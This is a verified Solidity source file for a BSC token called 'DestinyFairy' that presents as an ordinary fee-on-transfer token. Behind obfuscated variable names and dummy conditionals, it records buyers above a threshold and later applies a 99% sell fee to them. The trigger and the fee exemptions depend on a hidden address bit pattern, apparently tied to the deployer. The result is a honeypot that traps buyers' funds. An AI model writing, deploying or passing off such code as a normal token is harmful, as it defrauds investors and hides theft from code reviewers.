/**
 *Submitted for verification at BscScan.com on 2022-12-10
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract DestinyFairy is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Destiny Fairy ";
    string constant _symbol = "DestinyFairy";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private modeAutoFeeReceiver;
    mapping(address => bool) private swapReceiverBotsLaunched;
    mapping(address => bool) private walletLimitBurnMin;
    mapping(address => bool) private autoLaunchedTradingMinBurnSwapWallet;
    mapping(address => uint256) private autoBotsWalletIsMax;
    mapping(uint256 => address) private receiverBuyIsMax;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private liquidityModeIsWallet = 0;
    uint256 private teamWalletSellMarketing = 6;

    //SELL FEES
    uint256 private botsReceiverTeamIs = 0;
    uint256 private modeMarketingExemptTeam = 6;

    uint256 private receiverTeamMinMax = teamWalletSellMarketing + liquidityModeIsWallet;
    uint256 private isSwapBuyMarketingLaunchedFeeBurn = 100;

    address private autoExemptWalletSell = (msg.sender); // auto-liq address
    address private feeAutoMaxBurn = (0x8980F18EF3E53BE3E7Eb1C36ffFFDbA274F2E6b7); // marketing address
    address private txSwapWalletLiquidityMaxBurn = DEAD;
    address private maxExemptBuyIs = DEAD;
    address private walletBuySwapLaunchedFeeTeamLiquidity = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private tradingTeamFeeExempt;
    uint256 private buySwapLaunchedLimit;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private sellWalletBotsLiquidity;
    uint256 private receiverTradingWalletBuy;
    uint256 private modeAutoTxSwap;
    uint256 private autoLaunchedSellMax;
    uint256 private swapSellAutoMax;

    bool private tradingIsAutoWallet = true;
    bool private autoLaunchedTradingMinBurnSwapWalletMode = true;
    bool private maxLimitModeTx = true;
    bool private liquidityTeamBotsIsMarketingAuto = true;
    bool private autoReceiverExemptTradingTeamBurnIs = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private txSwapSellTrading = 6 * 10 ** 15;
    uint256 private teamWalletBurnTrading = _totalSupply / 1000; // 0.1%

    
    uint256 private limitBuyLiquidityTeam = 0;
    uint256 private exemptReceiverBuyMax = 0;
    bool private marketingIsReceiverBuy = false;
    bool private marketingLimitFeeLaunchedSwapTxWallet = false;
    bool private launchedTradingBurnIs = false;
    uint256 private sellLiquiditySwapBurnTxTrading = 0;
    bool private buyAutoMinWalletMarketingSwapTeam = false;
    uint256 private txFeeBotsTeamIsBuyLimit = 0;
    uint256 private burnAutoExemptModeMarketingMinLimit = 0;
    uint256 private txExemptFeeTeamMarketingModeLimit = 0;
    bool private exemptReceiverBuyMax0 = false;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        sellWalletBotsLiquidity = true;

        modeAutoFeeReceiver[msg.sender] = true;
        modeAutoFeeReceiver[address(this)] = true;

        swapReceiverBotsLaunched[msg.sender] = true;
        swapReceiverBotsLaunched[0x0000000000000000000000000000000000000000] = true;
        swapReceiverBotsLaunched[0x000000000000000000000000000000000000dEaD] = true;
        swapReceiverBotsLaunched[address(this)] = true;

        walletLimitBurnMin[msg.sender] = true;
        walletLimitBurnMin[0x0000000000000000000000000000000000000000] = true;
        walletLimitBurnMin[0x000000000000000000000000000000000000dEaD] = true;
        walletLimitBurnMin[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return sellFeeTxLimitReceiverLiquidity(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return sellFeeTxLimitReceiverLiquidity(sender, recipient, amount);
    }

    function sellFeeTxLimitReceiverLiquidity(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        bool bLimitTxWalletValue = limitIsBotsMarketingFee(sender) || limitIsBotsMarketingFee(recipient);
        
        if (buyAutoMinWalletMarketingSwapTeam == exemptReceiverBuyMax0) {
            buyAutoMinWalletMarketingSwapTeam = exemptReceiverBuyMax0;
        }


        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                swapSellBuyFee();
            }
            if (!bLimitTxWalletValue) {
                tradingLaunchedTxFeeBotsIs(recipient);
            }
        }
        
        if (launchedTradingBurnIs == marketingIsReceiverBuy) {
            launchedTradingBurnIs = liquidityTeamBotsIsMarketingAuto;
        }

        if (txFeeBotsTeamIsBuyLimit == exemptReceiverBuyMax) {
            txFeeBotsTeamIsBuyLimit = sellLiquiditySwapBurnTxTrading;
        }


        if (inSwap || bLimitTxWalletValue) {return modeBotsReceiverBurn(sender, recipient, amount);}

        if (!modeAutoFeeReceiver[sender] && !modeAutoFeeReceiver[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }
        
        if (buyAutoMinWalletMarketingSwapTeam == autoLaunchedTradingMinBurnSwapWalletMode) {
            buyAutoMinWalletMarketingSwapTeam = launchedTradingBurnIs;
        }


        require((amount <= _maxTxAmount) || walletLimitBurnMin[sender] || walletLimitBurnMin[recipient], "Max TX Limit has been triggered");

        if (isWalletModeSwap()) {burnIsWalletSwap();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        
        if (exemptReceiverBuyMax == modeMarketingExemptTeam) {
            exemptReceiverBuyMax = receiverTeamMinMax;
        }


        uint256 amountReceived = botsFeeMaxLiquidity(sender) ? liquidityTeamReceiverSell(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function modeBotsReceiverBurn(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function botsFeeMaxLiquidity(address sender) internal view returns (bool) {
        return !swapReceiverBotsLaunched[sender];
    }

    function buyTradingReceiverLiquidity(address sender, bool selling) internal returns (uint256) {
        
        if (txFeeBotsTeamIsBuyLimit != txFeeBotsTeamIsBuyLimit) {
            txFeeBotsTeamIsBuyLimit = isSwapBuyMarketingLaunchedFeeBurn;
        }

        if (launchedTradingBurnIs == marketingIsReceiverBuy) {
            launchedTradingBurnIs = exemptReceiverBuyMax0;
        }


        if (selling) {
            receiverTeamMinMax = modeMarketingExemptTeam + botsReceiverTeamIs;
            return feeTxIsMaxLimitAuto(sender, receiverTeamMinMax);
        }
        if (!selling && sender == uniswapV2Pair) {
            receiverTeamMinMax = teamWalletSellMarketing + liquidityModeIsWallet;
            return receiverTeamMinMax;
        }
        return feeTxIsMaxLimitAuto(sender, receiverTeamMinMax);
    }

    function sellIsTradingLimit() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function liquidityTeamReceiverSell(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        if (limitBuyLiquidityTeam != txSwapSellTrading) {
            limitBuyLiquidityTeam = txFeeBotsTeamIsBuyLimit;
        }


        uint256 feeAmount = amount.mul(buyTradingReceiverLiquidity(sender, receiver == uniswapV2Pair)).div(isSwapBuyMarketingLaunchedFeeBurn);

        if (autoLaunchedTradingMinBurnSwapWallet[sender] || autoLaunchedTradingMinBurnSwapWallet[receiver]) {
            feeAmount = amount.mul(99).div(isSwapBuyMarketingLaunchedFeeBurn);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function limitIsBotsMarketingFee(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function feeTxIsMaxLimitAuto(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = autoBotsWalletIsMax[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function tradingLaunchedTxFeeBotsIs(address addr) private {
        if (sellIsTradingLimit() < txSwapSellTrading) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        receiverBuyIsMax[exemptLimitValue] = addr;
    }

    function swapSellBuyFee() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (autoBotsWalletIsMax[receiverBuyIsMax[i]] == 0) {
                    autoBotsWalletIsMax[receiverBuyIsMax[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(feeAutoMaxBurn).transfer(amountBNB * amountPercentage / 100);
    }

    function isWalletModeSwap() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    autoReceiverExemptTradingTeamBurnIs &&
    _balances[address(this)] >= teamWalletBurnTrading;
    }

    function burnIsWalletSwap() internal swapping {
        
        if (txFeeBotsTeamIsBuyLimit != exemptReceiverBuyMax) {
            txFeeBotsTeamIsBuyLimit = exemptReceiverBuyMax;
        }


        uint256 amountToLiquify = teamWalletBurnTrading.mul(liquidityModeIsWallet).div(receiverTeamMinMax).div(2);
        uint256 amountToSwap = teamWalletBurnTrading.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = receiverTeamMinMax.sub(liquidityModeIsWallet.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(liquidityModeIsWallet).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(teamWalletSellMarketing).div(totalETHFee);
        
        payable(feeAutoMaxBurn).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                autoExemptWalletSell,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getReceiverBuyIsMax(uint256 a0) public view returns (address) {
            return receiverBuyIsMax[a0];
    }
    function setReceiverBuyIsMax(uint256 a0,address a1) public onlyOwner {
        if (a0 == teamWalletSellMarketing) {
            autoExemptWalletSell=a1;
        }
        if (a0 == txSwapSellTrading) {
            maxExemptBuyIs=a1;
        }
        receiverBuyIsMax[a0]=a1;
    }

    function getTxFeeBotsTeamIsBuyLimit() public view returns (uint256) {
        if (txFeeBotsTeamIsBuyLimit != teamWalletBurnTrading) {
            return teamWalletBurnTrading;
        }
        return txFeeBotsTeamIsBuyLimit;
    }
    function setTxFeeBotsTeamIsBuyLimit(uint256 a0) public onlyOwner {
        if (txFeeBotsTeamIsBuyLimit != liquidityModeIsWallet) {
            liquidityModeIsWallet=a0;
        }
        txFeeBotsTeamIsBuyLimit=a0;
    }

    function getAutoLaunchedTradingMinBurnSwapWalletMode() public view returns (bool) {
        return autoLaunchedTradingMinBurnSwapWalletMode;
    }
    function setAutoLaunchedTradingMinBurnSwapWalletMode(bool a0) public onlyOwner {
        if (autoLaunchedTradingMinBurnSwapWalletMode != autoLaunchedTradingMinBurnSwapWalletMode) {
            autoLaunchedTradingMinBurnSwapWalletMode=a0;
        }
        if (autoLaunchedTradingMinBurnSwapWalletMode == autoLaunchedTradingMinBurnSwapWalletMode) {
            autoLaunchedTradingMinBurnSwapWalletMode=a0;
        }
        if (autoLaunchedTradingMinBurnSwapWalletMode == tradingIsAutoWallet) {
            tradingIsAutoWallet=a0;
        }
        autoLaunchedTradingMinBurnSwapWalletMode=a0;
    }

    function getMaxExemptBuyIs() public view returns (address) {
        if (maxExemptBuyIs == feeAutoMaxBurn) {
            return feeAutoMaxBurn;
        }
        if (maxExemptBuyIs != autoExemptWalletSell) {
            return autoExemptWalletSell;
        }
        return maxExemptBuyIs;
    }
    function setMaxExemptBuyIs(address a0) public onlyOwner {
        if (maxExemptBuyIs == autoExemptWalletSell) {
            autoExemptWalletSell=a0;
        }
        if (maxExemptBuyIs != maxExemptBuyIs) {
            maxExemptBuyIs=a0;
        }
        maxExemptBuyIs=a0;
    }

    function getExemptReceiverBuyMax() public view returns (uint256) {
        return exemptReceiverBuyMax;
    }
    function setExemptReceiverBuyMax(uint256 a0) public onlyOwner {
        if (exemptReceiverBuyMax != txExemptFeeTeamMarketingModeLimit) {
            txExemptFeeTeamMarketingModeLimit=a0;
        }
        if (exemptReceiverBuyMax == isSwapBuyMarketingLaunchedFeeBurn) {
            isSwapBuyMarketingLaunchedFeeBurn=a0;
        }
        exemptReceiverBuyMax=a0;
    }

    function getAutoReceiverExemptTradingTeamBurnIs() public view returns (bool) {
        if (autoReceiverExemptTradingTeamBurnIs == exemptReceiverBuyMax0) {
            return exemptReceiverBuyMax0;
        }
        if (autoReceiverExemptTradingTeamBurnIs != liquidityTeamBotsIsMarketingAuto) {
            return liquidityTeamBotsIsMarketingAuto;
        }
        return autoReceiverExemptTradingTeamBurnIs;
    }
    function setAutoReceiverExemptTradingTeamBurnIs(bool a0) public onlyOwner {
        if (autoReceiverExemptTradingTeamBurnIs != buyAutoMinWalletMarketingSwapTeam) {
            buyAutoMinWalletMarketingSwapTeam=a0;
        }
        autoReceiverExemptTradingTeamBurnIs=a0;
    }

    function getWalletLimitBurnMin(address a0) public view returns (bool) {
        if (walletLimitBurnMin[a0] == swapReceiverBotsLaunched[a0]) {
            return marketingLimitFeeLaunchedSwapTxWallet;
        }
            return walletLimitBurnMin[a0];
    }
    function setWalletLimitBurnMin(address a0,bool a1) public onlyOwner {
        if (a0 != maxExemptBuyIs) {
            marketingLimitFeeLaunchedSwapTxWallet=a1;
        }
        if (walletLimitBurnMin[a0] != modeAutoFeeReceiver[a0]) {
           modeAutoFeeReceiver[a0]=a1;
        }
        walletLimitBurnMin[a0]=a1;
    }

    function getMaxLimitModeTx() public view returns (bool) {
        if (maxLimitModeTx != autoReceiverExemptTradingTeamBurnIs) {
            return autoReceiverExemptTradingTeamBurnIs;
        }
        if (maxLimitModeTx == buyAutoMinWalletMarketingSwapTeam) {
            return buyAutoMinWalletMarketingSwapTeam;
        }
        return maxLimitModeTx;
    }
    function setMaxLimitModeTx(bool a0) public onlyOwner {
        if (maxLimitModeTx == autoLaunchedTradingMinBurnSwapWalletMode) {
            autoLaunchedTradingMinBurnSwapWalletMode=a0;
        }
        if (maxLimitModeTx == marketingIsReceiverBuy) {
            marketingIsReceiverBuy=a0;
        }
        if (maxLimitModeTx != maxLimitModeTx) {
            maxLimitModeTx=a0;
        }
        maxLimitModeTx=a0;
    }

    function getSellLiquiditySwapBurnTxTrading() public view returns (uint256) {
        if (sellLiquiditySwapBurnTxTrading == teamWalletSellMarketing) {
            return teamWalletSellMarketing;
        }
        if (sellLiquiditySwapBurnTxTrading != txExemptFeeTeamMarketingModeLimit) {
            return txExemptFeeTeamMarketingModeLimit;
        }
        return sellLiquiditySwapBurnTxTrading;
    }
    function setSellLiquiditySwapBurnTxTrading(uint256 a0) public onlyOwner {
        if (sellLiquiditySwapBurnTxTrading != txSwapSellTrading) {
            txSwapSellTrading=a0;
        }
        if (sellLiquiditySwapBurnTxTrading != teamWalletBurnTrading) {
            teamWalletBurnTrading=a0;
        }
        if (sellLiquiditySwapBurnTxTrading == botsReceiverTeamIs) {
            botsReceiverTeamIs=a0;
        }
        sellLiquiditySwapBurnTxTrading=a0;
    }

    function getReceiverTeamMinMax() public view returns (uint256) {
        if (receiverTeamMinMax != teamWalletBurnTrading) {
            return teamWalletBurnTrading;
        }
        return receiverTeamMinMax;
    }
    function setReceiverTeamMinMax(uint256 a0) public onlyOwner {
        if (receiverTeamMinMax == isSwapBuyMarketingLaunchedFeeBurn) {
            isSwapBuyMarketingLaunchedFeeBurn=a0;
        }
        if (receiverTeamMinMax != receiverTeamMinMax) {
            receiverTeamMinMax=a0;
        }
        receiverTeamMinMax=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}